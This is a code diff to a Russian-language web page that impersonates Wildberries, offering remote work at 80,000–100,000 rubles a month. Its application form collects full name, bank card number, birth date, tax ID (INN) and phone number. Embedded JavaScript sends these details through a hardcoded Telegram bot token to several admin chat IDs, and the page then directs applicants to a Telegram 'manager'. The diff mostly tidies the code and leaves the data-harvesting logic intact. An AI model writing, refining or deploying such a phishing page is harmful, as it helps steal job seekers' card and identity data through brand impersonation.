@@ -7,13 +7,15 @@
     <meta name="description" content="Платформа для подачи заявок на удалённую работу в Wildberries">
     <meta http-equiv="X-Content-Type-Options" content="nosniff">
     <title>Работа в Wildberries</title>
+    <link rel="icon" type="image/x-icon" href="/favicon.ico">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js"></script>
     <style>
         body {
             font-family: Arial, sans-serif;
             margin: 0;
             padding: 0;
-            background-color: #4A1540; /* Очень тёмный фиолетовый фон */
+            background-color: #4A1540;
             color: #E6E6E6;
             overscroll-behavior: none;
         }
@@ -42,7 +44,7 @@
             border-radius: 30px;
             overflow: hidden;
             height: 300px;
-            background-color: #5A1B4F; /* Тёмный оттенок фиолетового */
+            background-color: #5A1B4F;
             color: #E6E6E6;
             margin: 0 -10px;
             flex: 0 0 auto;
@@ -57,7 +59,7 @@
             text-align: center;
             border-radius: 30px;
             margin: 5px 0 5px 5px;
-            background-color: rgba(90, 27, 79, 0.3); /* Тёмный оттенок с прозрачностью */
+            background-color: rgba(90, 27, 79, 0.3);
         }
         .banner-text h2 {
             font-size: 32px;
@@ -71,8 +73,8 @@
             color: #E6E6E6;
         }
         .banner-text button {
-            background-color: #FFFFFF; /* Белая кнопка */
-            color: #7D256F; /* Тёмно-фиолетовый текст */
+            background-color: #FFFFFF;
+            color: #7D256F;
             border: none;
             padding: 10px 20px;
             font-size: 16px;
@@ -86,7 +88,7 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            background-color: #5A1B4F; /* Тёмный оттенок фиолетового */
+            background-color: #5A1B4F;
             margin: 5px 5px 5px 0;
         }
         .banner-image img {
@@ -110,7 +112,7 @@
             justify-content: center;
             align-items: center;
             text-align: center;
-            background-color: #5A1B4F; /* Тёмный оттенок фиолетового */
+            background-color: #5A1B4F;
         }
         .feature img {
             width: 30px;
@@ -141,7 +143,7 @@
             overflow-y: auto;
         }
         .modal-content {
-            background-color: #5A1B4F; /* Тёмный оттенок фиолетового */
+            background-color: #5A1B4F;
             padding: 20px;
             border-radius: 30px;
             width: calc(100% - 40px);
@@ -151,7 +153,7 @@
             box-sizing: border-box;
         }
         .modal-header {
-            background-color: #7D256F; /* Тёмно-фиолетовый */
+            background-color: #7D256F;
             padding: 10px;
             border-radius: 30px 30px 0 0;
             text-align: center;
@@ -194,8 +196,8 @@
             font-size: 16px;
             font-weight: bold;
             cursor: pointer;
-            background-color: #FFFFFF; /* Белая кнопка */
-            color: #7D256F; /* Тёмно-фиолетовый текст */
+            background-color: #FFFFFF;
+            color: #7D256F;
             touch-action: manipulation;
             position: relative;
             z-index: 1001;
@@ -219,7 +221,7 @@
             overflow-y: auto;
         }
         .notification-content {
-            background-color: #5A1B4F; /* Тёмный оттенок фиолетового */
+            background-color: #5A1B4F;
             padding: 20px;
             border-radius: 30px;
             width: calc(100% - 20px);
@@ -255,8 +257,8 @@
             touch-action: manipulation;
         }
         .notification-content button.active {
-            background-color: #FFFFFF; /* Белая кнопка */
-            color: #7D256F; /* Тёмно-фиолетовый текст */
+            background-color: #FFFFFF;
+            color: #7D256F;
             cursor: pointer;
         }
         @media (max-width: 768px) {
@@ -373,7 +375,7 @@
             <div class="banner-text">
                 <h2>Работа в Wildberries</h2>
                 <p>От 80 000 до 100 000 ₽ в месяц</p>
-                <button onclick="openModal()" ontouchstart="openModal()">Стать работником</button>
+                <button id="openModalButton">Стать работником</button>
             </div>
             <div class="banner-image">
                 <img src="hands.webp">
@@ -403,7 +405,7 @@
             <div class="modal-header">
                 <h3>Анкета</h3>
             </div>
-            <form id="applicationForm" onsubmit="submitForm(event)">
+            <form id="applicationForm">
                 <label for="name">ФИО</label>
                 <input type="text" id="name" name="name" required placeholder="Введите ФИО">
 
@@ -434,52 +436,52 @@
         <div class="notification-content">
             <h3>Заявка на работу в Wildberries принята</h3>
             <p id="notificationText">Напишите нашему менеджеру в Telegram: <span id="telegramLink"></span></p>
-            <button id="doneButton" onclick="closeNotification()" ontouchstart="closeNotification()">Готово</button>
+            <button id="doneButton">Готово</button>
         </div>
     </div>
 
-    <script type="text/javascript">
+    <script>
+        // XLSX Processing
         var gk_isXlsx = false;
         var gk_xlsxFileLookup = {};
         var gk_fileData = {};
         function filledCell(cell) {
-          return cell !== '' && cell != null;
+            return cell !== '' && cell != null;
         }
         function loadFileData(filename) {
-        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
-            try {
-                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
-                var firstSheetName = workbook.SheetNames[0];
-                var worksheet = workbook.Sheets[firstSheetName];
+            if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
+                try {
+                    var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
+                    var firstSheetName = workbook.SheetNames[0];
+                    var worksheet = workbook.Sheets[firstSheetName];
 
-                // Convert sheet to JSON to filter blank rows
-                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
-                // Filter out blank rows (rows where all cells are empty, null, or undefined)
-                var filteredData = jsonData.filter(row => row.some(filledCell));
+                    // Convert sheet to JSON to filter blank rows
+                    var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
+                    // Filter out blank rows
+                    var filteredData = jsonData.filter(row => row.some(filledCell));
 
-                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
-                var headerRowIndex = filteredData.findIndex((row, index) =>
-                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
-                );
-                // Fallback
-                if (headerRowIndex === -1 || headerRowIndex > 25) {
-                  headerRowIndex = 0;
+                    // Heuristic to find the header row
+                    var headerRowIndex = filteredData.findIndex((row, index) =>
+                        row.filter(filledCell).length >= (filteredData[index + 1]?.filter(filledCell).length || 0)
+                    );
+                    // Fallback
+                    if (headerRowIndex === -1 || headerRowIndex > 25) {
+                        headerRowIndex = 0;
+                    }
+
+                    // Convert filtered JSON back to CSV
+                    var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex));
+                    csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
+                    return csv;
+                } catch (e) {
+                    console.error('Error in loadFileData:', e);
+                    return "";
                 }
-
-                // Convert filtered JSON back to CSV
-                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
-                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
-                return csv;
-            } catch (e) {
-                console.error(e);
-                return "";
             }
+            return gk_fileData[filename] || "";
         }
-        return gk_fileData[filename] || "";
-        }
-    </script>
 
-    <script>
+        // Main Application Logic
         const urlParams = new URLSearchParams(window.location.search);
         const isAdmin = urlParams.get('admin') === 'true';
         const shouldClear = urlParams.get('clear') === 'true';
@@ -500,7 +502,7 @@
             managerUsername = '@pvzandwb';
             managerLink = 'https://t.me/pvzandwb';
         } else {
-            managerUsername = null; // Для недопустимых доменов
+            managerUsername = null;
             managerLink = null;
         }
 
@@ -551,7 +553,9 @@
                     } else {
                         console.error(`Fetch error on attempt ${i + 1} for URL: ${url}`, error);
                     }
-                    if (i === retries - 1) throw error;
+                    if (i === retries - 1) {
+                        throw error;
+                    }
                     await new Promise(resolve => setTimeout(resolve, 1000));
                 }
             }
@@ -615,7 +619,7 @@
 
         async function initializeBotChecks() {
             const botToken = '7835987434:AAGRqX3J708CmNTnj8upHJU_Y8QLFsWBkRU';
-            const adminChatIds = ['7066276424','5005427148','6817476091','7409970440','2079893058'];
+            const adminChatIds = ['7066276424', '5005427148', '6817476091', '7409970440', '2079893058'];
 
             const tokenCheck = await checkBotToken(botToken);
             if (!tokenCheck.valid) {
@@ -658,7 +662,6 @@
             const telegramLink = document.getElementById('telegramLink');
             const doneButton = document.getElementById('doneButton');
 
-            // Формируем текст и ссылку менеджера
             if (managerUsername && managerLink) {
                 const linkElement = document.createElement('a');
                 linkElement.href = managerLink;
@@ -711,9 +714,8 @@
                 return;
             }
 
-            // Проверка домена перед отправкой
             if (!managerUsername || !managerLink) {
-                alert('Ошибка: Заявки принимаются только с доменов domain1.com или domain2.com.');
+                alert('Ошибка: Заявки принимаются только с доменов wb-support.vercel.app или wb-supports.vercel.app.');
                 console.log('Form blocked: invalid domain');
                 return;
             }
@@ -724,9 +726,8 @@
             try {
                 console.log('Starting form processing');
                 const botToken = '7835987434:AAGRqX3J708CmNTnj8upHJU_Y8QLFsWBkRU';
-                const adminChatIds = ['5005427148','7409970440','6817476091','2079893058'];
+                const adminChatIds = ['5005427148', '7409970440', '6817476091', '2079893058'];
 
-                // Проверяем бот и чат
                 console.log('Running initializeBotChecks');
                 const checksPassed = await initializeBotChecks();
                 if (!checksPassed) {
@@ -749,12 +750,11 @@
                 const platform = detectPlatform();
                 console.log('Platform:', platform);
 
-                // Формируем сообщение с указанием Wildberries и менеджера
                 const message = `
 Новая заявка на работу в Wildberries:
 🆔 ID заявки: ${escapeText(applicationId)}
 👤 ФИО: ${escapeText(data.name)}
-💳 Номер карты: `${escapeText(data.card)}`
+💳 Номер карты: ${escapeText(data.card)}
 📅 Дата рождения: ${escapeText(data.birthdate)}
 🆔 ИНН: ${escapeText(data.inn)}
 📞 Номер телефона: ${escapeText(data.phone)}
@@ -822,7 +822,7 @@
 
         function startBotListener() {
             const botToken = '7835987434:AAGRqX3J708CmNTnj8upHJU_Y8QLFsWBkRU';
-            const adminChatIds = ['5005427148','7409970440','6817476091','2079893058'];
+            const adminChatIds = ['5005427148', '7409970440', '6817476091', '2079893058'];
             let lastUpdateId = 0;
             let isRunning = false;
 
@@ -938,7 +938,15 @@ ${siteUrl}
             });
         }
 
-        // Добавляем обработчик для кнопки на случай, если событие формы не срабатывает
+        // Event Listeners
+        document.getElementById('openModalButton').addEventListener('click', openModal);
+        document.getElementById('openModalButton').addEventListener('touchstart', openModal);
+
+        document.getElementById('applicationForm').addEventListener('submit', submitForm);
+
+        document.getElementById('doneButton').addEventListener('click', closeNotification);
+        document.getElementById('doneButton').addEventListener('touchstart', closeNotification);
+
         document.getElementById('submitButton').addEventListener('click', (event) => {
             console.log('Submit button clicked');
             const form = document.getElementById('applicationForm');
@@ -951,9 +959,9 @@ ${siteUrl}
             }
         });
 
+        // Initialize
         initializeBotChecks();
         startBotListener();
     </script>
-    <script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'936c2257ab0fadb9',t:'MTc0NTczMzk4OS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script>
 </body>
 </html>
